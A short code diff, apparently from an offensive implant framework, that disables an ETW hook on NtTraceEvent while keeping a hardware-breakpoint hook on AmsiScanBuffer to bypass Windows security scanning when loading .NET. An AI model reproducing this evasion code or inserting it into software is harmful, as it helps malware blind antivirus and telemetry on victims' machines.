@@ -428,7 +428,7 @@ auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
         }
     }
 
-    this->Install( this->Etw.NtTraceEvent, Dr1, (PVOID)this->EtwThunk, Self->Session.ThreadID );
+    // this->Install( this->Etw.NtTraceEvent, Dr1, (PVOID)this->EtwThunk, Self->Session.ThreadID );
     return this->Install( this->Amsi.AmsiScanBuffer, Dr2, (PVOID)this->AmsiThunk, Self->Session.ThreadID );
 }
 
